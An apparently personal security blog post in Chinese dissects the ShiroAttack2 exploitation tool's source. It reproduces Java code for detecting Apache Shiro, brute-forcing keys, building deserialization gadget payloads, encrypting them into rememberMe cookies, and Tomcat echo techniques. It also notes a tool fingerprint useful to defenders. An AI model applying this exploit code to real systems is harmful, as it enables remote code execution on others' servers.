<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>shiro_attack工具分析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="shiro_attack工具分析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>shiro_attack工具分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/12/25/shiro-attack工具分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-12-25T04:10:22.000Z">
          2021-12-25
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近想要针对Shiro的利用工具扩展利用链，但自己完全写一个工具即麻烦也没有必要，因此想要通过<code>SummerSec</code>师傅开源的工具**<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">ShiroAttack2</a>**扩展来实现，既然要扩展首先就得了解项目的源码实现。本片文章中我不会通篇的对这个项目代码进行分析，只抽出几个我认为的要点进行分析。</p>
<span id="more"></span>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="密钥验证"><a href="#密钥验证" class="headerlink" title="密钥验证"></a>密钥验证</h3><p>​    在这款工具中，密钥验证主要是分为两种情况，一种是用户指定密钥，一种是未指定密钥时爆破密钥。无论是使用哪种方式来验证key都需要调用<code>checkIsShiro</code>方法判断是否为shiro。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定key </span></span><br><span class="line"><span class="meta">@FXML</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">crackSpcKeyBtn</span><span class="params">(ActionEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.initAttack();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.attackService.checkIsShiro()) &#123;</span><br><span class="line">            String spcShiroKey = <span class="keyword">this</span>.shiroKey.getText();</span><br><span class="line">            <span class="keyword">if</span> (!spcShiroKey.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.attackService.simpleKeyCrack(spcShiroKey);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.logTextArea.appendText(Utils.log(<span class="string">&quot;请输入指定密钥&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//爆破key</span></span><br><span class="line">    <span class="meta">@FXML</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">crackKeyBtn</span><span class="params">(ActionEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.initAttack();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.attackService.checkIsShiro()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.attackService.keysCrack();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>checkIsShiro</code>首先指定<code>remeberMe=1</code>通过返回结果是否包含<code>deleteMe</code>来判断是否为shiro框架。如果返回结果没有<code>deleteMe</code>则生成一个10位的随机数作为<code>remeberMe</code>的内容再去请求。这里之所以要生成一个位随机数我推测可能是防止WAF将<code>remeberMe=1</code>当作特征拦了。但是我这里还是想到了一种拦截思路，如果检测到<code>rememberMe=1</code> WAF直接阻断请求，那<code>result</code>的返回内容就会是<code>null</code>，在<code>result.contains(&quot;=deleteMe&quot;)</code>中就会触发异常，导致直接进入<code>catch</code>代码块，<strong>那样工具就无法检测是否为Shiro，后面的漏洞利用功能也会失效。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkIsShiro</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        HashMap&lt;String, String&gt; header = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//指定remeberMe=1</span></span><br><span class="line">        header.put(<span class="string">&quot;Cookie&quot;</span>, <span class="keyword">this</span>.shiroKeyWord + <span class="string">&quot;=1&quot;</span>);</span><br><span class="line">        String result = <span class="keyword">this</span>.headerHttpRequest(header);</span><br><span class="line">        flag = result.contains(<span class="string">&quot;=deleteMe&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(<span class="string">&quot;存在shiro框架！&quot;</span>));</span><br><span class="line">            flag = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            HashMap&lt;String, String&gt; header1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">            <span class="comment">//生成10位随机数判断</span></span><br><span class="line">            header1.put(<span class="string">&quot;Cookie&quot;</span>, <span class="keyword">this</span>.shiroKeyWord + <span class="string">&quot;=&quot;</span> + AttackService.getRandomString(<span class="number">10</span>));</span><br><span class="line">            String result1 = <span class="keyword">this</span>.headerHttpRequest(header1);</span><br><span class="line">            flag = result1.contains(<span class="string">&quot;=deleteMe&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(<span class="string">&quot;存在shiro框架！&quot;</span>));</span><br><span class="line">                flag = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(<span class="string">&quot;未发现shiro框架！&quot;</span>));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4.getMessage() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(var4.getMessage()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用链爆破"><a href="#利用链爆破" class="headerlink" title="利用链爆破"></a>利用链爆破</h3><p>​    无论使用什么利用链都需要和回显的方式配合，所以这里首先是拿出了利用链和回显方式并进行组合。组合后通过<code>:</code>分割，通过<code>gadgetCrack</code>检测这种利用链和回显方式是否存在。目前这款工具主要的利用链是CC利用链和Beanutils利用链。回显方式主要是<code>Tomcat</code>和<code>Spring</code>回显，作者后来版本也加了<code>通用回显</code>，这些回显方式之后我会分析。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crackGadgetBtn</span><span class="params">(ActionEvent event)</span> </span>&#123;</span><br><span class="line">      String spcShiroKey = <span class="keyword">this</span>.shiroKey.getText();</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.attackService == <span class="keyword">null</span>) &#123;</span><br><span class="line">          <span class="keyword">this</span>.initAttack();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (!spcShiroKey.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">          <span class="comment">//获取利用链和回显方式并进行组合</span></span><br><span class="line">          List&lt;String&gt; targets = <span class="keyword">this</span>.attackService.generateGadgetEcho(<span class="keyword">this</span>.gadgetOpt.getItems(), <span class="keyword">this</span>.echoOpt.getItems());</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; targets.size(); ++i) &#123;</span><br><span class="line">              String[] t = ((String)targets.get(i)).split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">              String gadget = t[<span class="number">0</span>];</span><br><span class="line">              String echo = t[<span class="number">1</span>];</span><br><span class="line">              <span class="comment">//检测利用链和回显方式是否存在</span></span><br><span class="line">              flag = <span class="keyword">this</span>.attackService.gadgetCrack(gadget, echo, spcShiroKey);</span><br><span class="line">              <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>.logTextArea.appendText(Utils.log(<span class="string">&quot;请先手工填入key或者爆破Shiro key&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">          <span class="keyword">this</span>.logTextArea.appendText(Utils.log(<span class="string">&quot;未找到构造链&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>gadgetCrack</code>生成<code>remeberMe</code>的内容并加上<code>Ctmd</code>请求头，最后判断返回中是否包含<code>08fb41620aa4c498a1f2ef09bbc1183c</code>判断是否利用成功，这里也可以当作这款工具的特征。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">gadgetCrack</span><span class="params">(String gadgetOpt, String echoOpt, String spcShiroKey)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//生成rememberMe</span></span><br><span class="line">          String rememberMe = <span class="keyword">this</span>.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);</span><br><span class="line">          <span class="keyword">if</span> (rememberMe != <span class="keyword">null</span>) &#123;</span><br><span class="line">              HashMap header = <span class="keyword">new</span> HashMap();</span><br><span class="line">              header.put(<span class="string">&quot;Cookie&quot;</span>, rememberMe + <span class="string">&quot;;&quot;</span>);</span><br><span class="line">              <span class="comment">//header中加入Ctmd头</span></span><br><span class="line">              header.put(<span class="string">&quot;Ctmd&quot;</span>, <span class="string">&quot;08fb41620aa4c498a1f2ef09bbc1183c&quot;</span>);</span><br><span class="line">              String result = <span class="keyword">this</span>.headerHttpRequest(header);</span><br><span class="line">              <span class="comment">//判断返回值中是否有08fb41620aa4c498a1f2ef09bbc1183c</span></span><br><span class="line">              <span class="keyword">if</span> (result.contains(<span class="string">&quot;08fb41620aa4c498a1f2ef09bbc1183c&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(<span class="string">&quot;[*] 发现构造链:&quot;</span> + gadgetOpt + <span class="string">&quot;  回显方式: &quot;</span> + echoOpt));</span><br><span class="line">                  <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(<span class="string">&quot;[*] 请尝试进行功能区利用。&quot;</span>));</span><br><span class="line">                  <span class="keyword">this</span>.mainController.gadgetOpt.setValue(gadgetOpt);</span><br><span class="line">                  <span class="keyword">this</span>.mainController.echoOpt.setValue(echoOpt);</span><br><span class="line">                  gadget = gadgetOpt;</span><br><span class="line">                  attackRememberMe = rememberMe;</span><br><span class="line">                  flag = <span class="keyword">true</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(<span class="string">&quot;[x] 测试:&quot;</span> + gadgetOpt + <span class="string">&quot;  回显方式: &quot;</span> + echoOpt));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">          <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(var8.getMessage()));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> flag;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    下面分析<code>remeberMe</code>生成部分，主要包含四个部分。</p>
<ul>
<li>获取利用链的Class对象并实例化</li>
<li>根据回显方式创建<code>TemplatesImpl</code>对象</li>
<li>传入<code>TemplatesImpl</code>通过getObject获取构建好的恶意对象</li>
<li>构建好恶意对象后AES加密后返回</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">GadgetPayload</span><span class="params">(String gadgetOpt, String echoOpt, String spcShiroKey)</span> </span>&#123;</span><br><span class="line">        String rememberMe = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取利用链的Class对象</span></span><br><span class="line">            Class&lt;? extends ObjectPayload&gt; gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);</span><br><span class="line">            ObjectPayload&lt;?&gt; gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();</span><br><span class="line">            <span class="comment">//根据回显方式创建TemplatesImpl对象</span></span><br><span class="line">            Object template = Gadgets.createTemplatesImpl(echoOpt);</span><br><span class="line">            <span class="comment">//创建恶意对象</span></span><br><span class="line">            Object chainObject = gadgetPayload.getObject(template);</span><br><span class="line">            <span class="comment">//生成的恶意对象AES加密后返回</span></span><br><span class="line">            rememberMe = shiro.sendpayload(chainObject, <span class="keyword">this</span>.shiroKeyWord, spcShiroKey);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line"><span class="comment">//            var9.printStackTrace();</span></span><br><span class="line">            <span class="keyword">this</span>.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rememberMe;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>获取利用链的Class对象并实例化</strong></p>
<p>​        根据类名获取对应的Class对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ObjectPayload</span>&lt;<span class="title">T</span>&gt; </span>&#123; <span class="function">T <span class="title">getObject</span><span class="params">(Object paramObject)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;? extends ObjectPayload&gt; getPayloadClass(String className) &#123;</span><br><span class="line">            Class&lt;? extends ObjectPayload&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//根据类名获取Class对象</span></span><br><span class="line">                clazz = (Class)Class.forName(<span class="string">&quot;com.summersec.attack.deser.payloads.&quot;</span> + StringUtils.capitalize(className));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>根据回显方式创建TemplatesImpl对象</strong></p>
<p>​    通过Javasist生成回显类并转换为字节码赋值给<code>_bytecodes</code>属性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span><span class="params">(String payload, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    T templates = tplClass.newInstance();</span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    <span class="comment">//根据名称通过forName加载回显的类</span></span><br><span class="line">    Class&lt;? extends EchoPayload&gt; echoClazz = Utils.getPayloadClass(payload);</span><br><span class="line">    EchoPayload&lt;?&gt; echoObj = (EchoPayload)echoClazz.newInstance();</span><br><span class="line">    <span class="comment">//通过Javasist动态生成回显类</span></span><br><span class="line">    CtClass clazz = echoObj.genPayload(pool);</span><br><span class="line">    CtClass superClass = pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superClass);</span><br><span class="line">    <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line">    <span class="comment">//将生成的回显类字节码赋值给_bytecodes属性</span></span><br><span class="line">    Field bcField = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bcField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    bcField.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">    Field nameField = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    nameField.set(templates, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通过getObject获取恶意对象</strong></p>
<p>​    通过getObject方法获取恶意对象，在这个工具里使用的利用链主要为CC链和<code>Beanutils</code>链。</p>
<p><strong>AES加密构建好的恶意对象</strong></p>
<p>​    由于Shiro在高版本中更换了GCM加密方式，因此根据版本的不同选择不同的加密算法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">sendpayload</span><span class="params">(Object chainObject, String shiroKeyWord, String key)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serpayload = SerializableUtils.toByteArray(chainObject);</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = DatatypeConverter.parseBase64Binary(key);</span><br><span class="line">    <span class="keyword">byte</span>[] encryptpayload = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//根据版本不同使用不同的加密算法</span></span><br><span class="line">    <span class="keyword">if</span> (AttackService.aesGcmCipherType == <span class="number">1</span>) &#123;</span><br><span class="line">        GcmEncrypt gcmEncrypt = <span class="keyword">new</span> GcmEncrypt();</span><br><span class="line">        String byteSource = gcmEncrypt.encrypt(key,serpayload);</span><br><span class="line">        System.out.println(shiroKeyWord + <span class="string">&quot;=&quot;</span> + byteSource);</span><br><span class="line">        <span class="keyword">return</span> shiroKeyWord + <span class="string">&quot;=&quot;</span> + byteSource;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        encryptpayload = AesUtil.encrypt(serpayload, bkey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> shiroKeyWord + <span class="string">&quot;=&quot;</span> + DatatypeConverter.printBase64Binary(encryptpayload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    关于利用链这里我想多提一些内容，因为本来分析这款工具的原理就是为了扩展利用链。通过上面的分析可以看到作者做了一个抽象，<code>getObject</code>传入的对象是构建好的<code>TemplateImpl</code>对象，所以这也是作者实现的利用链不多的原因，因为不是所有的利用链封装的都是<code>TemplateImpl</code>对象，而且也有很多利用方式无法回显利用。</p>
<h3 id="回显方式分析"><a href="#回显方式分析" class="headerlink" title="回显方式分析"></a>回显方式分析</h3><h4 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h4><p>​    Tomcat的回显主要的思路都是获取Response对象，并向Response中写入执行结果来实现，下面我对多种Tomcat回显的方式做一个简要总结。</p>
<ul>
<li><code>ApplicationFilterChain#lastServicedResponse</code>中记录了response的内容，所以可以通过获取<code>lastServicedResponse</code>来获取Response对象并进行写入。使用这种方式需要请求两次，因为在默认情况下<code>lastServicedResponse</code>中并不会记录<code>response</code>，所以第一次请求需要修改一个属性值让<code>lastServicedResponse</code>记录<code>response</code>。但是这种方式不能用在Shiro反序列化中回显，因为Shiro的反序列化发生在<code>lastServicedResponse</code>缓存Response之前，所以我们无法在反序列化的过程中拿到缓存中的Response对象。</li>
<li><code>AbstractProcessor#response</code>中存储了Response对象，可以通过获取这个属性值获取response对象。这种方式是通过<code>Thread.currentThread.getContextClassLoader()</code>获取<code>webappClassLoader</code>，再获取到Context最后一层层反射获取Response对象。这种方式的主要问题是代码量过多，在Shiro的利用中可能由于请求头过大导致利用失败。虽然可以通过在RemeberMe中只实现一个ClassLoader加载Body中的Class这种方式绕过。但是这样设计可能会导致和其他回显的利用方式有些差别，导致代码无法复用，所以我猜测这也是作者没有使用这种方式回显的原因。</li>
<li>首先通过<code>Thread.currentThread().getThreadGroup()</code>获取线程数组，从线程数组中找到包含<code>http</code>但不包含<code>exec</code>的线程。从保存的<code>NioEndPoint</code>中拿到<code>ConnectionHandler</code>，再从Handler中拿到<code>RequestInfo</code>对象，最后从<code>RequestInfo</code>中拿到Response。</li>
</ul>
<p>最后一种方式是这款工具使用的方式，虽然这种获取方式比较简洁，但是好像没有师傅给出为什么要这么获取的原因，下面我尝试对这种利用方式做出解释。</p>
<p>​    首先我们要知道，这种方式实际上是从<code>ClientPoller</code>线程中取出的<code>NioEndPoint</code>对象，并拿到<code>RequestInfo</code>对象。</p>
<p><strong>为什么从<code>ClientPoller</code>中可以拿到<code>NioEndPoint</code>对象？</strong></p>
<p>​    ClientPoller对象是在<code>NioEndPoint#startInternal</code>时创建的，在创建<code>ClientPoller</code>线程时传入了<code>poller</code>对象作为target属性，因此可以从<code>ClientPoller-&gt;target</code>中拿到poller对象，而<code>Poller</code>又是<code>NioEndpoint</code>的内部类，所以其<code>this$0</code>持有外部类<code>NioEndPoint</code>的引用。因此从<code>ClientPoller</code>线程中获取到<code>NioEndPoint</code>对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line">            initializeConnectionLatch();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Start poller thread</span></span><br><span class="line">            poller = <span class="keyword">new</span> Poller();</span><br><span class="line">            Thread pollerThread = <span class="keyword">new</span> Thread(poller, getName() + <span class="string">&quot;-ClientPoller&quot;</span>);</span><br><span class="line">            pollerThread.setPriority(threadPriority);</span><br><span class="line">            pollerThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">            pollerThread.start();</span><br><span class="line"></span><br><span class="line">            startAcceptorThread();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    另外<code>Acceptor</code>中也持有<code>NioEndpoint</code>对象，因此也可以获取到<code>RequestInfo</code>对象。</p>
<p><img src="/2021/12/25/shiro-attack%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/image-20211230123433646.png" alt="image-20211230123433646"></p>
<p><strong>为什么要通过for循环进行遍历Thread？</strong></p>
<p>​    虽然上面我们看到<code>ClientPoller</code>线程只有一个，但是作者在实现工具的时候却使用了for循环遍历，这是为什么？</p>
